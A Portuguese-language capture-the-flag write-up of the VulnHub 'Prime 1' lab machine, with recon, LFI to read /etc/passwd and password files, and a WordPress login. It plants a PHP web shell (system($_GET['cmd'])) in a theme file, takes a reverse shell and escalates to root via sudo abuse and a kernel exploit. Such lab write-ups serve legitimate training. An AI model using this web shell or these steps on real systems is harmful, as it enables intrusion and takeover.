---
title: "VulnHub - Prime 1"
tags: [Linux,Easy,Kernel,BurpSuite,Wfuzz,Gobuster,Wordpress,Linpeas,Web]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/inicial.png)

Link: <https://www.vulnhub.com/entry/prime-1,358/>

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.100/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Porta 22 -> Servidor SSH

> Porta 80 -> Servidor Web

## Enumeração da Porta 80 (Web)

Primeira coisa a se fazer sempre é verificar o que está sendo executado na porta 80, então vamos abrir o navegador para ver

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/web.png)

Pareceu um site normal mesmo... vamos prosseguir na enumeração

### Gobuster

Como de costume quando temos um website vamos jogar para o Gobuster pra vermos o que pode ser feito nesse site

```bash
gobuster dir -u http://192.168.56.104/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/gobuster.png)

Encontramos alguns diretórios com o gobuster, vamos acessar o `/dev`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/dev.png)

Nada de interessante... Aqui fala pra tentarmos mais ou outras ferramentas

Então agora rodamos o gobuster também pra procurar por arquivos `.txt`

```bash
gobuster dir -u http://192.168.56.104/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/gobuster1.png)

Esse secret.txt nos chamou atenção, então vamos verificar do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/secret.png)

Nos fala sobre tentar fazer um fuzzing com o wfuzz

**https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/web1.png)

Então vamos utilizar ela pra descobrir parâmetros dentro do site

### Wfuzz

Primeiro vamos descobrir qual é o parâmetro

```bash
wfuzz -t 200 -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hw 12 http://192.168.56.104/index.php?FUZZ=algo
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wfuzz2.png)

Agora por arquivos que possam ser de interesse com o parâmetro **file** que encontramos

```bash
wfuzz -t 200 -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hw 19 http://192.168.56.104/index.php?file=FUZZ.txt
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wfuzz.png)

Explicação parâmetros do wfuzz

```
-t 200 -> Aumento de threads, para ir mais rápido
-c -> Cores
-w -> Wordlist
--hw -> Vai esconder todas as respostas que tem 19 palavras, ou seja, as saidas de erro
```

Encontramos o `location.txt`, interessante, vamos ver o que tem nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/location.png)

Aqui ele fala pra usarmos o parâmetro `secrettier360` para encontrar algum php bacana, vamos lá então

```bash
wfuzz -t 200 -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hw 12 http://192.168.56.104/index.php?secrettier360=FUZZ.php
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wfuzz1.png)

Não encontramos nada de útil... Então vamos recorrer ao outro php que ele encontrou no início do gobuster, o `image.php`

### LFI

Testamos diversos LFI nele, e o que encontramos foi o ../../../../../etc/passwd, onde diz que devemos olhar pelo arquivo password.txt no home do saket

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/lfi.png)

Nada de interessante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/lfi1.png)

follow_the_ippsec? Estranho, isso pode ser um senha de alguma coisa... vamos tentar entrar no wordpress que tem nele, que encontramos lá no começo do gobuster

## WordPress

Vimos que não deu certo com o usuário saket

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp3.png)

Então testamos com o `victor` que também tinha no /etc/passwd

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp5.png)

E estamos dentro!

Depois de fuçar um pouco nele encontramos um arquivo que podemos escrever, o `secret.php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp6.png)

## Reverse shell

Então adicionamos um reverse shell ali pra receber na nossa máquina

**<?php system($_GET['cmd']);?>**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp7.png)

Salvamos e testamos agora

```
http://192.168.56.104/wordpress/wp-content/themes/twentynineteen/secret.php?cmd=id
```

Temos RCE!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp8.png)

# Usuário Comum

Agora pegamos um shell reverso

Setamos nosso nc

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/rev.png)

Jogamos pro BurpSuite, só pra ficar melhor de trabalhar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/rev1.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/rev2.png)

Agora pegamos o reverse

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/rev3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/rev4.png)

Vamos iniciar a escalação de privilégio

# www-data para Saket

Para enumerar vamos executar o `linpeas` pra ver se encontramos algum ponto de escalação de priviégio

**https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas.png)

Passamos pra máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas1.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas2.png)

Agora vamos verificar o que podemos fazer para escalar privilégio nesse máquina

Encontramos que o www-data pode dar um comando de sudo... interessante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas3.png)

Confirmamos isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas4.png)

Ao executarmos, ele pede um senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas5.png)

"backup_password"

Não sabemos a senha, mas rodando pelas pastas da máquina encontramos algo interessante em **/opt/backup/backup_pass**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas6.png)

É a senha do enc... então executamos ele denovo com essa senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas7.png)

Ele nos deu outro arquivo, o **key.txt** e o **enc.txt**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas8.png)

Uma vez que temos a chave e o arquivo encriptado, podemos decritografar ele

Aqui está o código, a fonte foi o Blog do [mzfr](https://blog.mzfr.me/vulnhub-writeups/2019-09-04-prime)

```python
from Crypto.Cipher import AES
from base64 import b64decode

data = b64decode(b"nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=")
key = b"366a74cb3c959de17d61db30591c39d1"
cip = AES.new(key,AES.MODE_ECB)
print(cip.decrypt(data).decode("utf-8"))
```

E conseguimos outra senha, possivelmente do usuário Victor ou do saket

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/dec.png)

Conseguimos logar com o saket

# Saket para root

Damos um **su saket** e entramos como saket agora

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/sak.png)

Olhando no **sudo -l** verificamos que podemos executar outro comando como root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/sudo.png)

Executamos e vemos o que é feito

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/sudo1.png)

Possivelmente ele está procurando por um arquivo em **/tmp/challenge** e executando ele como root

Então vamos criar esse arquivo com um simples /bin/bash e executar pra virar root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/sudo2.png)

## Flags

Agora pegamos as flags

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/root.png)

# Algo a mais

Também podemos pegar o root dessa máquina de outra máneira, através da exploração do kernel dela

**4.10.0-28-generic**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/uname.png)

Pesquisamos por exploit para essa versão então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/kernel.png)

**https://github.com/kkamagui/linux-kernel-exploits/tree/master/kernel-4.10.0-28-generic/CVE-2017-16995**

Encontramos um que nos satisfaz

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/kernel1.png)

Baixamos e passamos pra máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/kernel2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/kernel3.png)

Compilamos executamos e viramos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/kernel4.png)